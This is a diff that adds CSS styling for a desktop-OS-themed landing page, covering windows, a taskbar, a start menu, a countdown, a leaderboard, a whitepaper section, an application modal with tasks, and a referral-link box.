@@ -51,4 +51,1336 @@ body{font-family:'Rajdhani',sans-serif;background:#000;color:#fff;overflow:hidde
 #screen-gate.hide{opacity:0;pointer-events:none;}
 .gate-win{background:rgba(4,11,24,.97);border:1px solid rgba(0,184,255,.28);border-radius:8px 8px 4px 4px;width:420px;max-width:92vw;overflow:hidden;box-shadow:0 20px 80px rgba(0,0,0,.9),0 0 40px rgba(0,184,255,.08),inset 0 1px 0 rgba(255,255,255,.05);animation:winOpen .45s cubic-bezier(.22,.61,.36,1);}
 @keyframes winOpen{from{opacity:0;transform:scale(.93) translateY(14px);}to{opacity:1;transform:scale(1) translateY(0);}}
-.gate-tb{display:flex;align-items:center;gap:8px;padding:0 8px 0 12px;height:var(--tb-h);background:linear-gradient(180deg,#1e5aa8 0%,#103578 50%,#
+.gate-tb{display:flex;align-items:center;gap:8px;padding:0 8px 0 12px;height:var(--tb-h);background:linear-gradient(180deg,#1e5aa8 0%,#103578 50%,#0a2868 100%);border-bottom:1px solid rgba(0,184,255,.22);user-select:none;position:relative;}
+.gate-tb::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.22),transparent);}
+.gate-tb-icon{font-size:13px;}
+.gate-tb-label{flex:1;font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:#fff;text-shadow:0 0 8px rgba(0,184,255,.4);}
+.gate-tb-btns{display:flex;gap:3px;}
+.gtbtn{width:17px;height:17px;border-radius:3px;border:none;cursor:pointer;font-size:10px;display:flex;align-items:center;justify-content:center;font-weight:900;line-height:1;transition:filter .15s;}
+.gtbtn:hover{filter:brightness(1.3);}
+.gtbtn-min{background:linear-gradient(180deg,#3a88e0,#1e60b0);color:#fff;box-shadow:inset 0 1px 0 rgba(255,255,255,.2);}
+.gtbtn-cls{background:linear-gradient(180deg,#e84848,#be2020);color:#fff;box-shadow:inset 0 1px 0 rgba(255,255,255,.2);}
+.gate-body{padding:30px 32px 28px;text-align:center;}
+.gate-lock{font-size:50px;filter:drop-shadow(0 0 22px var(--blue));animation:lockFloat 3s ease-in-out infinite;display:block;margin-bottom:16px;}
+@keyframes lockFloat{0%,100%{transform:translateY(0);}50%{transform:translateY(-8px);}}
+.gate-title{font-family:'Orbitron',monospace;font-size:clamp(16px,5vw,22px);letter-spacing:6px;font-weight:900;background:linear-gradient(135deg,#fff 40%,var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;}
+.gate-sub{font-size:13px;color:rgba(255,255,255,.42);max-width:320px;margin:0 auto 22px;line-height:1.75;}
+.btn-gate{padding:11px 38px;background:linear-gradient(180deg,#2a8de8 0%,#1a62b0 45%,#144ea0 100%);border:1px solid rgba(0,184,255,.4);color:#fff;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:4px;cursor:pointer;transition:all .3s;border-radius:3px;box-shadow:0 4px 18px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.16);}
+.btn-gate:hover{background:linear-gradient(180deg,#3a9ef8,#2a72c0,#1a5ea8);box-shadow:0 0 24px rgba(0,184,255,.38),0 4px 18px rgba(0,0,0,.45);}
+.gate-eth{font-family:'Space Mono',monospace;font-size:8px;letter-spacing:3px;color:rgba(255,255,255,.18);margin-top:18px;}
+
+/* ══ SITE / DESKTOP ══ */
+#site{position:fixed;inset:0;z-index:10;opacity:0;pointer-events:none;transition:opacity 1s ease;}
+#site.visible{opacity:1;pointer-events:all;}
+#desktop{position:absolute;inset:0;bottom:var(--bar-h);overflow:hidden;}
+
+/* ══ DESKTOP ICONS ══ */
+.dsk-icons{position:absolute;top:18px;left:14px;display:flex;flex-direction:column;gap:4px;z-index:5;}
+.d-ico{display:flex;flex-direction:column;align-items:center;gap:5px;width:72px;padding:8px 4px 6px;border-radius:4px;cursor:pointer;transition:background .15s;user-select:none;}
+.d-ico:hover{background:rgba(0,184,255,.16);backdrop-filter:blur(10px);}
+.d-ico:active{background:rgba(0,184,255,.28);}
+.d-ico-em{font-size:30px;line-height:1;filter:drop-shadow(0 2px 8px rgba(0,0,0,.8)) drop-shadow(0 0 8px rgba(0,184,255,.28));}
+.d-ico-lbl{font-size:10px;color:#fff;text-align:center;line-height:1.3;letter-spacing:.3px;text-shadow:1px 1px 4px rgba(0,0,0,.95),0 0 8px rgba(0,0,0,.7);word-break:break-word;max-width:70px;}
+
+/* ══ OS WINDOWS ══ */
+.os-win{position:absolute;display:flex;flex-direction:column;background:rgba(4,11,24,.93);backdrop-filter:blur(28px);border-radius:8px 8px 4px 4px;border:1px solid rgba(0,184,255,.2);box-shadow:0 8px 48px rgba(0,0,0,.78),0 0 0 1px rgba(0,184,255,.06),inset 0 1px 0 rgba(255,255,255,.04);overflow:hidden;z-index:50;transition:box-shadow .25s;}
+.os-win.focused{box-shadow:0 14px 70px rgba(0,0,0,.88),0 0 32px rgba(0,184,255,.1),0 0 0 1px rgba(0,184,255,.24);}
+.os-win.win-opening{animation:winOpen .28s cubic-bezier(.22,.61,.36,1);}
+
+/* Title bar */
+.win-tb{display:flex;align-items:center;gap:8px;padding:0 8px 0 12px;height:var(--tb-h);background:linear-gradient(180deg,#1e5aa8 0%,#103578 50%,#0a2868 100%);border-bottom:1px solid rgba(0,184,255,.2);cursor:grab;user-select:none;flex-shrink:0;position:relative;}
+.win-tb::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);}
+.win-tb:active{cursor:grabbing;}
+.win-tb-icon{font-size:13px;flex-shrink:0;filter:drop-shadow(0 0 5px rgba(0,184,255,.5));}
+.win-tb-title{flex:1;font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:#fff;text-shadow:0 0 9px rgba(0,184,255,.45);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.win-ctrls{display:flex;gap:3px;flex-shrink:0;}
+.wbtn{width:18px;height:18px;border-radius:3px;border:none;cursor:pointer;font-size:10px;display:flex;align-items:center;justify-content:center;font-weight:900;line-height:1;transition:filter .15s;box-shadow:inset 0 1px 0 rgba(255,255,255,.18);}
+.wbtn:hover{filter:brightness(1.3);}
+.wbtn-min{background:linear-gradient(180deg,#3a88e0,#1e60b0);color:#fff;}
+.wbtn-max{background:linear-gradient(180deg,#3a88e0,#1e60b0);color:#fff;}
+.wbtn-cls{background:linear-gradient(180deg,#e84848,#be2020);color:#fff;}
+
+/* Window body */
+.win-body{flex:1;overflow-y:auto;overflow-x:hidden;padding:22px 26px;scrollbar-width:thin;scrollbar-color:rgba(0,184,255,.3) rgba(0,0,0,.2);}
+.win-body::-webkit-scrollbar{width:5px;}
+.win-body::-webkit-scrollbar-track{background:rgba(0,0,0,.2);}
+.win-body::-webkit-scrollbar-thumb{background:rgba(0,184,255,.3);border-radius:3px;}
+
+/* Status bar */
+.win-sb{height:20px;display:flex;align-items:center;padding:0 12px;gap:14px;background:rgba(0,0,0,.3);border-top:1px solid rgba(0,184,255,.07);flex-shrink:0;}
+.wsb-item{font-family:'Space Mono',monospace;font-size:8px;letter-spacing:1px;color:rgba(255,255,255,.28);display:flex;align-items:center;gap:5px;}
+.wsb-dot{width:4px;height:4px;border-radius:50%;background:var(--success);box-shadow:0 0 4px var(--success);}
+.wsb-dot.blue{background:var(--blue);box-shadow:0 0 4px var(--blue);}
+
+/* ══ TASKBAR ══ */
+#taskbar{position:fixed;bottom:0;left:0;right:0;height:var(--bar-h);background:linear-gradient(180deg,rgba(6,16,38,.97) 0%,rgba(3,9,22,.99) 100%);backdrop-filter:blur(22px);border-top:1px solid rgba(0,184,255,.18);display:flex;align-items:center;gap:3px;padding:0 5px;z-index:200;box-shadow:0 -2px 28px rgba(0,0,0,.65),inset 0 1px 0 rgba(0,184,255,.07);}
+
+/* Start button */
+#start-btn{display:flex;align-items:center;gap:7px;padding:4px 14px;height:35px;background:linear-gradient(180deg,#2a8de8 0%,#1a62b0 45%,#144ea0 100%);border:1px solid rgba(0,184,255,.42);border-radius:4px;cursor:pointer;color:#fff;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:2px;font-weight:700;transition:all .2s;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.18);}
+#start-btn:hover{background:linear-gradient(180deg,#3a9ef8,#2a72c0,#1a62aa);box-shadow:0 0 20px rgba(0,184,255,.4),0 2px 10px rgba(0,0,0,.5);}
+#start-btn svg{filter:drop-shadow(0 0 5px rgba(0,184,255,.7));}
+.tb-sep{width:1px;height:28px;background:rgba(0,184,255,.1);flex-shrink:0;margin:0 3px;}
+
+/* Window task buttons */
+#tb-wins{display:flex;gap:2px;flex:1;overflow-x:auto;padding:0 3px;}
+#tb-wins::-webkit-scrollbar{height:2px;}
+#tb-wins::-webkit-scrollbar-thumb{background:rgba(0,184,255,.2);}
+.tb-wbtn{display:flex;align-items:center;gap:6px;padding:3px 10px;height:33px;min-width:115px;max-width:155px;background:rgba(0,32,72,.45);border:1px solid rgba(0,184,255,.12);border-radius:3px;cursor:pointer;color:rgba(255,255,255,.62);font-family:'Rajdhani',sans-serif;font-size:12px;letter-spacing:.7px;transition:all .18s;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex-shrink:0;}
+.tb-wbtn:hover{background:rgba(0,55,120,.52);border-color:rgba(0,184,255,.26);color:#fff;}
+.tb-wbtn.active-win{background:rgba(0,68,148,.45);border-color:rgba(0,184,255,.38);color:#fff;box-shadow:inset 0 2px 5px rgba(0,0,0,.4);}
+.tb-wbtn-ico{font-size:13px;flex-shrink:0;}
+
+/* System tray */
+#sys-tray{display:flex;align-items:center;gap:10px;padding:0 10px;margin-left:auto;border-left:1px solid rgba(0,184,255,.1);height:35px;flex-shrink:0;}
+.tray-item{display:flex;align-items:center;gap:5px;font-family:'Space Mono',monospace;font-size:8px;color:rgba(255,255,255,.44);letter-spacing:1px;}
+.tray-net-dot{width:5px;height:5px;border-radius:50%;background:var(--success);box-shadow:0 0 6px var(--success);animation:livePulse 2s infinite;}
+@keyframes livePulse{0%,100%{opacity:1;}50%{opacity:.3;}}
+.tray-eth-dot{color:rgba(100,170,255,.55);font-size:12px;}
+#sys-clock{font-family:'Orbitron',monospace;font-size:11px;color:rgba(255,255,255,.65);letter-spacing:2px;text-align:right;line-height:1.2;}
+#sys-date{font-family:'Space Mono',monospace;font-size:7px;color:rgba(255,255,255,.28);letter-spacing:1px;text-align:right;margin-top:1px;}
+
+/* ══ START MENU ══ */
+#start-menu{position:fixed;bottom:var(--bar-h);left:5px;width:340px;background:linear-gradient(180deg,rgba(6,17,40,.98) 0%,rgba(3,10,26,.99) 100%);backdrop-filter:blur(26px);border:1px solid rgba(0,184,255,.22);border-radius:8px 8px 0 0;box-shadow:0 -8px 40px rgba(0,0,0,.8),0 0 24px rgba(0,184,255,.07);z-index:210;display:none;overflow:hidden;}
+#start-menu.open{display:block;animation:menuUp .22s cubic-bezier(.22,.61,.36,1);}
+@keyframes menuUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.sm-head{background:linear-gradient(135deg,#1a4a8a,#0d2d5c);padding:14px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid rgba(0,184,255,.15);}
+.sm-avatar{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,#001428,#002448);border:2px solid rgba(0,184,255,.4);display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 0 16px rgba(0,184,255,.3);flex-shrink:0;}
+.sm-info-name{font-family:'Orbitron',monospace;font-size:11px;font-weight:700;letter-spacing:2px;color:#fff;}
+.sm-info-role{font-size:10px;color:rgba(255,255,255,.36);letter-spacing:.8px;margin-top:3px;}
+.sm-cols{display:grid;grid-template-columns:1fr 1fr;}
+.sm-col{padding:6px 0;}
+.sm-col:first-child{border-right:1px solid rgba(0,184,255,.07);}
+.sm-col-head{font-family:'Space Mono',monospace;font-size:8px;letter-spacing:2px;color:rgba(255,255,255,.28);padding:6px 14px 2px;text-transform:uppercase;}
+.sm-item{display:flex;align-items:center;gap:9px;padding:8px 14px;cursor:pointer;transition:background .15s;color:rgba(255,255,255,.75);font-size:13px;letter-spacing:.3px;}
+.sm-item:hover{background:rgba(0,184,255,.1);color:var(--blue);}
+.sm-item-ico{font-size:15px;}
+.sm-sep{height:1px;background:rgba(0,184,255,.07);margin:3px 0;}
+.sm-foot{display:flex;justify-content:space-between;align-items:center;padding:8px 14px;border-top:1px solid rgba(0,184,255,.1);background:rgba(0,0,0,.28);flex-wrap:wrap;gap:8px;}
+.sm-links{display:flex;gap:10px;flex-wrap:wrap;}
+.sm-link{font-size:9px;letter-spacing:.8px;color:rgba(255,255,255,.28);text-decoration:none;transition:color .2s;}
+.sm-link:hover{color:var(--blue);}
+.sm-copy{font-family:'Space Mono',monospace;font-size:7px;color:rgba(255,255,255,.18);letter-spacing:1px;}
+
+/* ══ SECTION LABELS ══ */
+.sec-label{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:5px;color:var(--blue);margin-bottom:10px;text-transform:uppercase;}
+.sec-title{font-family:'Orbitron',monospace;font-size:clamp(16px,3vw,26px);font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,#fff,var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;}
+.sec-line{width:40px;height:2px;background:linear-gradient(90deg,var(--blue),transparent);margin-bottom:22px;}
+
+/* ══ HERO (inside window) ══ */
+.hero-eyebrow{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:5px;color:var(--blue);margin-bottom:16px;display:flex;align-items:center;gap:10px;}
+.hero-eyebrow::before,.hero-eyebrow::after{content:'';width:26px;height:1px;background:var(--blue);opacity:.5;}
+.hero-headline{font-family:'Orbitron',monospace;font-size:clamp(18px,3.2vw,32px);font-weight:900;line-height:1.1;letter-spacing:2px;background:linear-gradient(135deg,#fff 0%,var(--glow) 50%,var(--blue) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;}
+.hero-sub{font-size:clamp(12px,1.6vw,14px);color:rgba(255,255,255,.48);max-width:480px;line-height:1.75;margin-bottom:24px;letter-spacing:.2px;}
+.cd-label{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:3px;color:rgba(255,255,255,.3);margin-bottom:11px;text-align:center;}
+.countdown-wrap{display:flex;align-items:center;gap:5px;flex-wrap:wrap;justify-content:center;margin-bottom:22px;}
+.cd-block{background:rgba(0,184,255,.06);border:1px solid rgba(0,184,255,.2);padding:11px 13px;min-width:62px;text-align:center;position:relative;overflow:hidden;border-radius:2px;}
+.cd-block::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue),transparent);}
+.cd-num{font-family:'Orbitron',monospace;font-size:clamp(18px,3vw,30px);font-weight:900;color:var(--blue);text-shadow:0 0 18px var(--blue);display:block;line-height:1;}
+.cd-unit{font-size:7px;letter-spacing:3px;color:rgba(255,255,255,.3);margin-top:4px;text-transform:uppercase;}
+.cd-sep{font-family:'Orbitron',monospace;font-size:20px;color:var(--blue);opacity:.35;padding-bottom:5px;}
+.btn-enter-hero{padding:12px 42px;background:linear-gradient(135deg,var(--ocean),var(--glow));color:#000;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:4px;border:none;cursor:pointer;font-weight:700;transition:all .3s;box-shadow:0 0 22px rgba(0,184,255,.36);margin-bottom:14px;border-radius:2px;}
+.btn-enter-hero:hover{transform:translateY(-2px);box-shadow:0 5px 32px rgba(0,184,255,.52);}
+.scroll-hint{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:2px;color:rgba(255,255,255,.18);}
+.cta-mini{margin-top:22px;padding-top:18px;border-top:1px solid rgba(0,184,255,.08);}
+.cta-mini-eyebrow{font-family:'Space Mono',monospace;font-size:9px;letter-spacing:4px;color:var(--blue);margin-bottom:8px;}
+.cta-title-inner{font-family:'Orbitron',monospace;font-size:clamp(13px,2.2vw,20px);font-weight:900;background:linear-gradient(135deg,#fff,var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:7px;}
+.cta-sub-inner{font-size:13px;color:rgba(255,255,255,.4);max-width:360px;line-height:1.75;margin-bottom:14px;}
+.btn-cta{padding:12px 38px;background:linear-gradient(135deg,var(--ocean),var(--glow));color:#000;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:4px;border:none;cursor:pointer;font-weight:700;transition:all .3s;box-shadow:0 0 22px rgba(0,184,255,.32);border-radius:2px;}
+.btn-cta:hover{transform:translateY(-2px);box-shadow:0 5px 32px rgba(0,184,255,.5);}
+
+/* ══ STATS ══ */
+.stats-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;max-width:560px;}
+.stat-card{background:var(--glass);border:1px solid var(--gb);padding:22px 16px;text-align:center;backdrop-filter:blur(8px);transition:all .35s;position:relative;overflow:hidden;}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue),transparent);opacity:0;transition:opacity .35s;}
+.stat-card:hover{background:rgba(0,184,255,.09);transform:translateY(-3px);}
+.stat-card:hover::before{opacity:1;}
+.stat-num{font-family:'Orbitron',monospace;font-size:clamp(20px,3.2vw,34px);font-weight:900;color:var(--blue);text-shadow:0 0 20px var(--blue);display:block;}
+.stat-lbl{font-size:9px;letter-spacing:2.5px;color:rgba(255,255,255,.34);margin-top:5px;text-transform:uppercase;}
+
+/* ══ LEADERBOARD ══ */
+.lb-wrap{max-width:540px;}
+.live-ind{display:flex;align-items:center;gap:7px;font-family:'Space Mono',monospace;font-size:8px;color:rgba(255,255,255,.32);letter-spacing:2px;margin-bottom:12px;}
+.live-dot{width:5px;height:5px;background:var(--success);border-radius:50%;animation:livePulse 1.5s ease-in-out infinite;box-shadow:0 0 6px var(--success);}
+.lb-row{display:flex;align-items:center;gap:11px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);transition:all .25s;cursor:default;}
+.lb-row:hover{background:rgba(0,184,255,.05);padding-left:20px;}
+.lb-row:hover .lb-name{color:var(--blue);}
+.lb-rank{font-family:'Orbitron',monospace;font-size:10px;color:rgba(255,255,255,.26);width:26px;text-align:right;letter-spacing:1px;}
+.lb-rank.t3{color:var(--blue);text-shadow:0 0 8px var(--blue);}
+.lb-av{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--navy),var(--ocean));display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:var(--blue);border:1px solid rgba(0,184,255,.24);flex-shrink:0;}
+.lb-name{flex:1;font-size:13px;font-weight:600;letter-spacing:.4px;transition:color .25s;}
+.lb-pts{font-family:'Space Mono',monospace;font-size:9px;color:rgba(255,255,255,.26);letter-spacing:1px;}
+.lb-badge{font-size:7px;letter-spacing:2px;padding:2px 6px;background:rgba(0,184,255,.1);border:1px solid rgba(0,184,255,.24);color:var(--blue);text-transform:uppercase;}
+
+/* ══ HOW IT WORKS ══ */
+.steps-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;max-width:620px;}
+.step-card{padding:20px 16px;background:var(--glass);border:1px solid var(--gb);position:relative;overflow:hidden;transition:all .35s;}
+.step-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--blue),transparent);transform:scaleX(0);transition:transform .35s;transform-origin:left;}
+.step-card:hover{transform:translateY(-4px);background:rgba(0,184,255,.07);}
+.step-card:hover::after{transform:scaleX(1);}
+.step-num{font-family:'Orbitron',monospace;font-size:32px;font-weight:900;color:rgba(0,184,255,.11);line-height:1;margin-bottom:9px;}
+.step-ttl{font-family:'Orbitron',monospace;font-size:11px;letter-spacing:2px;margin-bottom:6px;}
+.step-desc{font-size:12px;color:rgba(255,255,255,.4);line-height:1.65;}
+
+/* ══ WHITEPAPER ══ */
+.wp-inner{max-width:680px;}
+.wp-section{margin-bottom:34px;}
+.wp-h2{font-family:'Orbitron',monospace;font-size:clamp(11px,1.8vw,15px);letter-spacing:2px;font-weight:700;color:var(--blue);margin-bottom:11px;padding-bottom:8px;border-bottom:1px solid rgba(0,184,255,.12);}
+.wp-h3{font-family:'Orbitron',monospace;font-size:11px;letter-spacing:2px;font-weight:600;color:#fff;margin-bottom:7px;margin-top:13px;}
+.wp-p{font-size:13px;color:rgba(255,255,255,.5);line-height:1.78;letter-spacing:.15px;margin-bottom:10px;}
+.wp-ul{list-style:none;padding:0;}
+.wp-ul li{font-size:13px;color:rgba(255,255,255,.47);line-height:1.7;padding:5px 0 5px 15px;position:relative;border-bottom:1px solid rgba(255,255,255,.03);}
+.wp-ul li::before{content:'◆';position:absolute;left:0;color:var(--blue);font-size:7px;top:9px;}
+.wp-pillar{background:rgba(0,184,255,.04);border:1px solid rgba(0,184,255,.1);padding:16px 18px;margin-bottom:12px;transition:all .3s;}
+.wp-pillar:hover{background:rgba(0,184,255,.07);border-color:rgba(0,184,255,.18);}
+.wp-pillar-icon{font-size:18px;margin-bottom:6px;}
+.wp-arch{background:rgba(0,0,0,.55);border:1px solid rgba(0,184,255,.14);padding:14px;font-family:'Space Mono',monospace;font-size:10px;color:rgba(0,184,255,.62);line-height:1.7;overflow-x:auto;margin:12px 0;}
+.wp-phase{display:flex;gap:13px;padding:13px 0;border-bottom:1px solid rgba(255,255,255,.04);}
+.wp-phase-num{font-family:'Orbitron',monospace;font-size:10px;color:var(--blue);white-space:nowrap;padding-top:2px;min-width:66px;}
+.wp-phase-content .wp-h3{margin-top:0;margin-bottom:5px;}
+.wp-tag{display:inline-block;font-size:8px;letter-spacing:2px;padding:2px 7px;background:rgba(0,184,255,.1);border:1px solid rgba(0,184,255,.22);color:var(--blue);margin-right:5px;margin-top:3px;text-transform:uppercase;}
+.timeline{position:relative;padding-left:22px;}
+.timeline::before{content:'';position:absolute;left:4px;top:0;bottom:0;width:1px;background:linear-gradient(180deg,var(--blue),transparent);}
+.tl-item{position:relative;padding-bottom:22px;}
+.tl-item::before{content:'';position:absolute;left:-19px;top:4px;width:8px;height:8px;border-radius:50%;background:var(--blue);box-shadow:0 0 8px var(--blue);}
+
+/* ══ MODAL (Apply Window) ══ */
+.modal-overlay{position:fixed;inset:0;z-index:600;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .35s;}
+.modal-overlay.open{opacity:1;pointer-events:all;}
+.modal{background:rgba(4,11,24,.98);border:1px solid rgba(0,184,255,.24);width:100%;max-width:500px;border-radius:8px 8px 4px 4px;position:relative;transform:translateY(20px) scale(.97);transition:transform .35s;max-height:90vh;overflow-y:auto;box-shadow:0 20px 80px rgba(0,0,0,.9),0 0 0 1px rgba(0,184,255,.07);}
+.modal-overlay.open .modal{transform:translateY(0) scale(1);}
+.modal-tb{display:flex;align-items:center;gap:8px;padding:0 8px 0 12px;height:var(--tb-h);background:linear-gradient(180deg,#1e5aa8 0%,#103578 50%,#0a2868 100%);border-bottom:1px solid rgba(0,184,255,.2);border-radius:7px 7px 0 0;position:sticky;top:0;z-index:10;flex-shrink:0;}
+.modal-tb::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);}
+.modal-tb-icon{font-size:13px;}
+.modal-tb-title{flex:1;font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:#fff;text-shadow:0 0 8px rgba(0,184,255,.4);}
+.modal-close{background:linear-gradient(180deg,#e84848,#be2020);width:17px;height:17px;border-radius:3px;border:none;color:#fff;font-size:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-weight:900;transition:filter .15s;box-shadow:inset 0 1px 0 rgba(255,255,255,.18);}
+.modal-close:hover{filter:brightness(1.25);}
+.modal-inner{padding:24px 28px;}
+.modal-title{font-family:'Orbitron',monospace;font-size:18px;letter-spacing:3px;font-weight:900;margin-bottom:5px;background:linear-gradient(135deg,#fff,var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.modal-sub{font-size:12px;color:rgba(255,255,255,.35);letter-spacing:.4px;margin-bottom:20px;}
+.field-wrap{margin-bottom:15px;}
+.field-label{font-size:9px;letter-spacing:3px;color:rgba(255,255,255,.35);margin-bottom:6px;display:block;text-transform:uppercase;}
+.field-input{width:100%;padding:11px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.09);color:#fff;font-family:'Rajdhani',sans-serif;font-size:15px;outline:none;transition:all .3s;border-radius:2px;}
+.field-input:focus{border-color:var(--blue);background:rgba(0,184,255,.04);box-shadow:0 0 14px rgba(0,184,255,.1);}
+.field-input::placeholder{color:rgba(255,255,255,.2);}
+.tasks-wrap{margin:18px 0;}
+.tasks-heading{font-size:9px;letter-spacing:3px;color:rgba(255,255,255,.35);margin-bottom:10px;text-transform:uppercase;}
+.task-item{display:flex;align-items:center;gap:11px;padding:10px 14px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);margin-bottom:6px;transition:all .28s;cursor:default;border-radius:2px;}
+.task-item:hover{background:rgba(0,184,255,.06);border-color:rgba(0,184,255,.18);}
+.task-item.done{border-color:rgba(0,255,136,.18);}
+.task-icon{font-size:14px;width:20px;text-align:center;flex-shrink:0;}
+.task-text{flex:1;font-size:13px;letter-spacing:.2px;}
+.task-item.done .task-text{color:rgba(255,255,255,.36);text-decoration:line-through;}
+.task-link{font-size:8px;letter-spacing:2px;color:var(--blue);text-decoration:none;padding:4px 8px;border:1px solid rgba(0,184,255,.28);transition:all .25s;white-space:nowrap;flex-shrink:0;border-radius:2px;}
+.task-link:hover{background:var(--blue);color:#000;}
+.btn-submit-modal{width:100%;padding:13px;background:linear-gradient(135deg,var(--ocean),var(--glow));color:#000;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:4px;border:none;cursor:pointer;font-weight:700;transition:all .3s;box-shadow:0 0 18px rgba(0,184,255,.26);margin-top:5px;border-radius:2px;}
+.btn-submit-modal:disabled{opacity:.3;cursor:not-allowed;box-shadow:none;}
+.btn-submit-modal:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 5px 28px rgba(0,184,255,.44);}
+.progress-hint{font-size:10px;color:rgba(255,255,255,.3);text-align:center;margin-top:8px;letter-spacing:1px;}
+.success-view{display:none;text-align:center;padding:10px 0 4px;}
+/* Congrats burst */
+.congrats-burst{position:relative;width:80px;height:80px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;}
+.congrats-ring{position:absolute;inset:0;border-radius:50%;border:2px solid var(--blue);animation:burstRing 1.2s ease forwards;}
+@keyframes burstRing{0%{transform:scale(0);opacity:1;}100%{transform:scale(1.8);opacity:0;}}
+.congrats-icon{font-size:44px;animation:popIn .5s cubic-bezier(.175,.885,.32,1.275);}
+@keyframes popIn{0%{transform:scale(0);}100%{transform:scale(1);}}
+.success-title{font-family:'Orbitron',monospace;font-size:clamp(18px,5vw,26px);letter-spacing:4px;font-weight:900;background:linear-gradient(135deg,#fff 30%,var(--glow));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:7px;}
+.success-badge{display:inline-block;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:3px;padding:4px 14px;background:rgba(0,184,255,.1);border:1px solid rgba(0,184,255,.35);color:var(--blue);margin-bottom:14px;border-radius:2px;}
+.success-sub{font-size:13px;color:rgba(255,255,255,.42);line-height:1.75;margin-bottom:22px;}
+/* Referral box */
+.referral-box{background:rgba(0,184,255,.05);border:1px solid rgba(0,184,255,.22);padding:16px;margin-bottom:18px;text-align:left;border-radius:4px;position:relative;overflow:hidden;}
+.referral-box::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue),transparent);}
+.referral-label{display:flex;align-items:center;gap:7px;font-family:'Space Mono',monospace;font-size:8px;letter-spacing:2px;color:rgba(255,255,255,.36);margin-bottom:10px;}
+.referral-dot{width:5px;height:5px;border-radius:50%;background:var(--success);box-shadow:0 0 6px var(--success);animation:livePulse 1.5s infinite;}
+.referral-link-row{display:flex;align-items:center;gap:8px;}
+.referral-link-text{flex:1;font-family:'Space Mono',monospace;font-size:11px;color:var(--blue);background:rgba(0,0,0,.35);border:1px solid rgba(0,184,255,.18);padding:9px 12px;border-radius:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;}
+.referral-copy-btn{flex-shrink:0;padding:9px 16px;background:linear-gradient(180deg,#2a8de8,#1a62b0);border:1px solid rgba(0,184,255,.4);color:#fff;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:2px;cursor:pointer;border-radius:3px;transition:all .2s;box-shadow:inset 0 1px 0 rgba(255,255,255,.15);}
+.referral-copy-btn:hover{background:linear-gradient(180deg,#3a9ef8,#2272c0);box-shadow:0 0 14px rgba(0,184,255,.3);}
+.referral-copy-btn.copied{background:linear-gradient(180deg,#00c853,#00952e);border-color:rgba(0,255,136,.4);}
+.referral-copied{font-family:'Space Mono',monospace;font-size:9px;color:var(--success);letter-spacing:2px;margin-top:7px;opacity:0;transition:opacity .3s;text-align:center;}
+.referral-copied.show{opacity:1;}
+/* Share message */
+.share-msg{background:rgba(0,0,0,.3);border:1px solid rgba(0,184,255,.1);padding:16px;margin-bottom:18px;border-radius:4px;text-align:left;}
+.share-msg-title{font-family:'Orbitron',monospace;font-size:11px;letter-spacing:2px;color:#fff;margin-bottom:8px;}
+.share-msg-text{font-size:12px;color:rgba(255,255,255,.42);line-height:1.7;margin-bottom:14px;}
+.share-btns{display:flex;gap:8px;flex-wrap:wrap;}
